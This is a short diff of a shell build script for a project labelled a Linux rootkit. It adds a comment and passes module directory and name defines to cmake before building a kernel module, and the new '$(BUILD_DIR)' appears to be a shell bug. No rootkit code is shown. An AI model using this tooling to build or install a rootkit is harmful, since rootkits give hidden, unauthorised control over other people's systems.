@@ -2,6 +2,7 @@
 
 BUILD_DIR=/home/idan/CLionProjects/Rootkit/linux/build
 
+# linux rootkit
 ROOTKIT_SOURCE_DIR=/home/idan/CLionProjects/Rootkit/linux
 KM_SOURCE_DIR=/home/idan/CLionProjects/Rootkit/linux/kernel_access/kernel_module/
 
@@ -10,7 +11,7 @@ mkdir -p $BUILD_DIR
 
 # cmake the rootkit
 cd $BUILD_DIR
-cmake $ROOTKIT_SOURCE_DIR
+cmake -DMODULE_DIR="\"$(BUILD_DIR)/\"" -DMODULE_NAME="\"my_module\"" $ROOTKIT_SOURCE_DIR
 make -j4
 
 # make the kernel module
